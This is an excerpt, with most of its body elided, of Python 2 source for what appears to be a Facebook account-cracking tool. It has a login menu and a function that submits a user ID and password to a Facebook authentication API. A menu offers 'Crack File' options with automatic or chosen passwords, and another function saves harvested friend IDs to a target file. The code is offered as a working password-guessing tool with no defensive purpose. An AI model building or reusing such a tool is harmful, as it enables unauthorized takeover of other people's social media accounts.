...
def login_choice():
    ...
    try:
        ...
        print logo
        print ''
        print '\t    \x1b[1;92mLOGIN MENU\x1b[0;97m'
        print ''
...
def login_fb():
    ...
    print ''
    data = requests.get('http://b-api.facebook.com/method/auth?id=' + uid + '&pass=' + pwd, headers = header).text
    q = json.loads(data)
    if 'loc' in q:
...
def menu():
    ...
    print 47 * '-'
    print ''
    print '[1] Crack File / Auto Pass'
    print '[2] Crack File with / Your Pass'
    print '[3] Create File'
    print '[0] Back'
    print ''
    menu_option()
...
def ex_id():
    ...
    print ' File downloaded successfully\n Copy This File : /storage/0/emulated/ids_friends.txt'
    time.sleep(1)
    menu()
